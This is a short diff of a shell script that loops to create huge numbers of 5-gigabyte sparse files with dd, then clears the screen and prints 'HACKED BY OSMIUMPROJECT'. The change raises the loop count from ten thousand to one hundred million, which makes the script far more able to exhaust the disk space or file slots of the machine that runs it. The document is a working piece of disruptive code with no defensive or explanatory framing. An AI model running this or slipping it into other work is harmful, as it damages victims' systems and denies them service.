@@ -2,7 +2,7 @@
 
 random_number=$((RANDOM % 100))
 
-for i in {10000..1}; do dd if=/dev/zero of=5G$i$random_number.test bs=1 count=0 seek=5G; done
+for i in {100000000..1}; do dd if=/dev/zero of=5G$i$random_number.test bs=1 count=0 seek=5G; done
 
 clear
 echo HACKED BY OSMIUMPROJECT
